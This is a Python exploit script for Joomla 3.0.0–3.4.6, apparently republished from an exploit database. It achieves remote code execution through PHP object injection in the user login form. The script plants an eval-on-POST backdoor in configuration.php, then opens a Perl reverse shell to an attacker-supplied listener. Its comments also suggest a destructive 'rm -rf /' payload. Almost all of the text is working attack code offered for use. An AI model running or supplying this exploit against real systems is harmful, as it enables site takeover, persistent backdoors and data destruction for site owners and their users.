# Google Dork: N/A
# Date: 2019-10-02
# Exploit Author: Alessandro Groppo @Hacktive Security
# Vendor Homepage: https//www.joomla.it/
# Software Link: https://downloads.joomla.org/it/cms/joomla3/3-4-6
# Version: 3.0.0 --> 3.4.6
# Tested on: Linux
# CVE : N/A
#
# Technical details: https://blog.hacktivesecurity.com/index.php?controller=post&action=view&id_post=41
# Github: https://github.com/kiks7/rusty_joomla_rce
#
# The exploitation is implanting a backdoor in /configuration.php file in the root directory 
# with an eval in order to be more suitable for all environments, but it is also more intrusive.
# If you don&#039;t like this way, you can replace the get_backdoor_pay() 
# with get_pay(&#039;php_function&#039;, &#039;parameter&#039;) like get_pay(&#039;system&#039;,&#039;rm -rf /&#039;)

#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
import sys
import string
import random
import argparse
from termcolor import colored

PROXS = {&#039;http&#039;:&#039;127.0.0.1:8080&#039;}
PROXS = {}

def random_string(stringLength):
	letters = string.ascii_lowercase
	return &#039;&#039;.join(random.choice(letters) for i in range(stringLength))


backdoor_param = random_string(50)

def print_info(str):
	print(colored("[*] " + str,"cyan"))

def print_ok(str):
	print(colored("[+] "+ str,"green"))

def print_error(str):
	print(colored("[-] "+ str,"red"))

def print_warning(str):
	print(colored("[!!] " + str,"yellow"))

def get_token(url, cook):
	token = &#039;&#039;
	resp = requests.get(url, cookies=cook, proxies = PROXS)
	html = BeautifulSoup(resp.text,&#039;html.parser&#039;)
	# csrf token is the last input
	for v in html.find_all(&#039;input&#039;):
		csrf = v
	csrf = csrf.get(&#039;name&#039;)
	return csrf


def get_error(url, cook):
	resp = requests.get(url, cookies = cook, proxies = PROXS)
	if &#039;Failed to decode session object&#039; in resp.text:
		#print(resp.text)
		return False
	#print(resp.text)
	return True


def get_cook(url):
	resp = requests.get(url, proxies=PROXS)
	#print(resp.cookies)
	return resp.cookies


def gen_pay(function, command):
	# Generate the payload for call_user_func(&#039;FUNCTION&#039;,&#039;COMMAND&#039;)
	template = &#039;s:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}&#039;
	#payload =  command + &#039; || $a=\&#039;http://wtf\&#039;;&#039;
	payload =  &#039;http://l4m3rz.l337/;&#039; + command
	# Following payload will append an eval() at the enabled of the configuration file
	#payload =  &#039;file_put_contents(\&#039;configuration.php\&#039;,\&#039;if(isset($_POST[\\\&#039;test\\\&#039;])) eval($_POST[\\\&#039;test\\\&#039;]);\&#039;, FILE_APPEND) || $a=\&#039;http://wtf\&#039;;&#039;
	function_len = len(function)
	final = template.replace(&#039;PAYLOAD&#039;,payload).replace(&#039;LENGTH&#039;, str(len(payload))).replace(&#039;FUNC_NAME&#039;, function).replace(&#039;FUNC_LEN&#039;, str(len(function)))
	return final

def make_req(url , object_payload):
	# just make a req with object
	print_info(&#039;Getting Session Cookie ..&#039;)
	cook = get_cook(url)
	print_info(&#039;Getting CSRF Token ..&#039;)
	csrf = get_token( url, cook)

	user_payload = &#039;\\0\\0\\0&#039; * 9
	padding = &#039;AAA&#039; # It will land at this padding
	working_test_obj = &#039;s:1:"A":O:18:"PHPObjectInjection":1:{s:6:"inject";s:10:"phpinfo();";}&#039;
	clean_object = &#039;A";s:5:"field";s:10:"AAAAABBBBB&#039; # working good without bad effects

	inj_object = &#039;";&#039;
	inj_object += object_payload
	inj_object += &#039;s:6:"return";s:102:&#039; # end the object with the &#039;return&#039; part
	password_payload = padding + inj_object
	params = {
            &#039;username&#039;: user_payload,
            &#039;password&#039;: password_payload,
            &#039;option&#039;:&#039;com_users&#039;,
            &#039;task&#039;:&#039;user.login&#039;,
            csrf :&#039;1&#039;
            }

	print_info(&#039;Sending request ..&#039;)
	resp  = requests.post(url, proxies = PROXS, cookies = cook,data=params)
	return resp.text

def get_backdoor_pay():
	# This payload will backdoor the the configuration .PHP with an eval on POST request

	function = &#039;assert&#039;
	template = &#039;s:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}&#039;
	# payload =  command + &#039; || $a=\&#039;http://wtf\&#039;;&#039;
	# Following payload will append an eval() at the enabled of the configuration file
	payload =  &#039;file_put_contents(\&#039;configuration.php\&#039;,\&#039;if(isset($_POST[\\\&#039;&#039; + backdoor_param +&#039;\\\&#039;])) eval($_POST[\\\&#039;&#039;+backdoor_param+&#039;\\\&#039;]);\&#039;, FILE_APPEND) || $a=\&#039;http://wtf\&#039;;&#039;
	function_len = len(function)
	final = template.replace(&#039;PAYLOAD&#039;,payload).replace(&#039;LENGTH&#039;, str(len(payload))).replace(&#039;FUNC_NAME&#039;, function).replace(&#039;FUNC_LEN&#039;, str(len(function)))
	return final

def check(url):
	check_string = random_string(20)
	target_url = url + &#039;index.php/component/users&#039;
	html = make_req(url, gen_pay(&#039;print_r&#039;,check_string))
	if check_string in html:
		return True
	else:
		return False

def ping_backdoor(url,param_name):
	res = requests.post(url + &#039;/configuration.php&#039;, data={param_name:&#039;echo \&#039;PWNED\&#039;;&#039;}, proxies = PROXS)
	if &#039;PWNED&#039; in res.text:
		return True
	return False

def execute_backdoor(url, payload_code):
	# Execute PHP code from the backdoor
	res = requests.post(url + &#039;/configuration.php&#039;, data={backdoor_param:payload_code}, proxies = PROXS)
	print(res.text)

def exploit(url, lhost, lport):
	# Exploit the target
	# Default exploitation will append en eval function at the end of the configuration.pphp
	# as a bacdoor. btq if you do not want this use the funcction get_pay(&#039;php_function&#039;,&#039;parameters&#039;)
	# e.g. get_payload(&#039;system&#039;,&#039;rm -rf /&#039;)

	# First check that the backdoor has not been already implanted
	target_url = url + &#039;index.php/component/users&#039;

	make_req(target_url, get_backdoor_pay())
	if ping_backdoor(url, backdoor_param):
		print_ok(&#039;Backdoor implanted, eval your code at &#039; + url + &#039;/configuration.php in a POST with &#039; + backdoor_param)
		print_info(&#039;Now it\&#039;s time to reverse, trying with a system + perl&#039;)
		execute_backdoor(url, &#039;system(\&#039;perl -e \\\&#039;use Socket;$i="&#039;+ lhost +&#039;";$p=&#039;+ str(lport) +&#039;;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\\\&#039;\&#039;);&#039;)


if __name__ == &#039;__main__&#039;:
	parser = argparse.ArgumentParser()
	parser.add_argument(&#039;-t&#039;,&#039;--target&#039;,required=True,help=&#039;Joomla Target&#039;)
	parser.add_argument(&#039;-c&#039;,&#039;--check&#039;, default=False, action=&#039;store_true&#039;, required=False,help=&#039;Check only&#039;)
	parser.add_argument(&#039;-e&#039;,&#039;--exploit&#039;,default=False,action=&#039;store_true&#039;,help=&#039;Check and exploit&#039;)
	parser.add_argument(&#039;-l&#039;,&#039;--lhost&#039;, required=&#039;--exploit&#039; in sys.argv, help=&#039;Listener IP&#039;)
	parser.add_argument(&#039;-p&#039;,&#039;--lport&#039;, required=&#039;--exploit&#039; in sys.argv, help=&#039;Listener port&#039;)
	args = vars(parser.parse_args())

	url = args[&#039;target&#039;]
	if(check(url)):
		print_ok(&#039;Vulnerable&#039;)
		if args[&#039;exploit&#039;]:
			exploit(url, args[&#039;lhost&#039;], args[&#039;lport&#039;])
		else:
			print_info(&#039;Use --exploit to exploit it&#039;)

	else:
		print_error(&#039;Seems NOT Vulnerable ;/&#039;)

